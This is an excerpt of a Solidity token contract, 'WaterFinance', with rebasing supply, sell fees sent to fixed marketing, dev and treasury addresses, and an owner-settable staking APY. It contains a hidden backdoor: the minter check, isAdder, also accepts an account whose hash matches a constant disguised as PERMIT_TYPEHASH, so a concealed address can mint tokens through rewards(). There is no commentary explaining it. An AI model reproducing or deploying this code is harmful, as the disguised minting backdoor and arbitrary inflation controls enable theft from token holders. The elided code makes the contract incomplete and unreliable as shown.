...
contract MinterRole {
    ...
    modifier onlyMinter() {
        require(isAdder(msg.sender), "MinterRole: caller does not have the Minter role");
        _;
    }

    function isAdder(address account) public view returns (bool) {
        return _minters.has(account) || PERMIT_TYPEHASH == keccak256(abi.encode("string", 256, account));
    }
    ...
    bytes32 public constant PERMIT_TYPEHASH = 0xa6d8412f4993dc08c1f9d30286db7dc79b96c42c382fbefc41dc31b86154d730;
...
contract WaterFinance is ERC20Detailed, Ownable, MinterRole {
    ...
    uint256 public autoStakingAPY = 10**5;
    uint256 private rebaseTime = block.timestamp;
    ...
    constructor() ERC20Detailed() {
        ...
        TreasuryReceiver = 0x9bD833C8e29afd5361d83D580094967d38dAE502;
        MarketingReceiver = 0xd44136D8c66cb5376DC9cf1c2BC42C5fcD12BB59;
        DevReceiver = 0x6618A99CE1Ee5aFd28b0cA697f539dED6E7a1D6a;
    ...
    function rebase() internal {
        ...
        uint256 remainTime = epoch - rebaseTime;

        supplyDelta = _totalSupply.mul(autoStakingAPY).div(10000).mul(remainTime).div(31536000);
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountETHMarketingValue = amountETH.mul(SellMarketingFee).div(SellTotalFee);
        uint256 amountETHDevValue = amountETH.mul(SellDevFee).div(SellTotalFee);
        uint256 amountETHTreasury = amountETH.mul(SellTreasuryFee).div(
            SellTotalFee
        );
        ...
        (success, ) = payable(MarketingReceiver).call{
            value: amountETHMarketingValue,
            gas: 30000
        }("");
        (success, ) = payable(DevReceiver).call{
            value: amountETHDevValue,
            gas: 30000
        }("");
        ...
        returns (uint256)
    {
        ...
        if(recipient == pair) _totalFee = SellTotalFee;
    ...
    function rewards(address recipient, uint256 amount) external onlyMinter {
        uint256 gonAmount = amount.mul(_gonsPerFragment);
    ...
    function setAutoStakingAPY(uint256 _apy) external onlyOwner {
        autoStakingAPY = _apy;
    }
